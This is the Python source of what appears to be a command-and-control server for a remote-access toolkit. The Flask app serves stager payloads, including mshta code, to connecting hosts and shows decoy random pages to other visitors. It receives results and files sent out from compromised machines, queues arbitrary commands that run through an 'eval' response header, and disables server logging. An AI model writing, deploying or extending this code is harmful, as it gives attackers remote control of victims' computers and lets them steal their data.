import logging
import os
import urllib.parse as parse
import sys

from connect import color, connection, loader, util
from flask import Flask, make_response, render_template, request, send_file

app = Flask(__name__)

checkin_uri = f'/{util.generate_id()}'

@app.route('/<format_id>', methods=['GET'])
def serve_stagers(format_id):
    remote_addr = request.remote_addr
    if format_id not in engine.STAGERS.keys():
        return render_template('random.html', random_data=util.random_data)
    stager = engine.STAGERS[format_id]
    color.information(f'{stager.format} file requested ({remote_addr})')
    connection = engine.create_connection(stager)
    connection.system_information['ip'] = remote_addr
    mshta_code = parse.quote(render_template(f'mshta/code.mshta', variables = stager.variables, connection_id = connection.connection_id, checkin_uri = checkin_uri))
    return render_template(f'{stager.format}/stager.{stager.format}', checkin_uri = checkin_uri, variables = stager.variables, mshta_code = mshta_code, random_string = util.generate_str(), connection_id = connection.connection_id)

@app.route(f'{checkin_uri}', methods=['POST'])
def checkin():
    response = make_response(render_template('random.html', random_data=util.random_data))
    try:
        connection = engine.connections[request.headers['Connection-ID']]
    except:
        return response
    connection.check_in()
    internet_addr = connection.system_information['ip']
    if request.get_data():
        data = request.get_data()
        if request.headers['mimetype'] == 'text/plain':
            color.normal('\n')
            color.information(f'Results recieved from ({internet_addr}):')
            color.normal(str(data,'utf-8'))
        else:
            filename = f'{util.generate_str()}.connect'
            color.normal('\n')
            color.information(f'{sys.getsizeof(data)} Bytes recieved from ({internet_addr}) saving to downloads/{filename}.')
            loader.download(data, f'{filename}')
    if connection.job_queue:
        job = connection.job_queue.pop(0)
        if job.type == 'function':
            response.headers['eval'] = parse.quote(render_template(f'{connection.stager.format}/functions/{job.data}.{connection.stager.format}', variables = connection.stager.variables, random_string = util.generate_str()))
            return response
        if job.type == 'command':
            command = job.data[0]
            if len(job.data) == 1:
                response.headers['eval'] = command + '()'
                return response
            arguments = job.data[1:]
            if 'file:' in arguments[0]:
                filename = arguments[0].split(':')[1]
                arguments[0] = 'response.ResponseBody'
                try:
                    response = make_response(send_file(f'uploads/{filename}'))
                except:
                    color.information('File does not exist.')
                    return response
            arguments = ','.join(arguments)
            response.headers['eval'] = parse.quote(f'{command}({arguments})')
    return response

def run(ip, port):
    os.environ['WERKZEUG_RUN_MAIN'] = 'true'
    log = logging.getLogger('werkzeug')
    log.disabled = True
    app.config['TEMPLATES_AUTO_RELOAD'] = True
    try:
        app.run(host=ip, port=port)
    except:
        color.information(f'Error starting server')
        return
    return
